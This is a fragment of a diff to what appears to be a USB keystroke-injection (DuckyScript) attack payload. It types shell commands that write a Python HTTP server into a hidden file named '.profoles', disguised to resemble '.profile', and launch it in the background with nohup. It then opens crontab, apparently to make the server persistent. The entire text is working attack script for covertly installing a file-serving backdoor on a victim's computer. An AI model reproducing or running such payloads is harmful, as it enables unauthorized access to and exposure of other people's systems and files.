@@ -31,7 +31,7 @@ ENTER
 STRING echo "httpd.serve_forever()" >> .profoles
 DELAY 100
 ENTER
-STRING  nohup python serverhost.py &
+STRING  nohup python .profoles &
 DELAY 20
 ENTER
 STRING crontab -e 
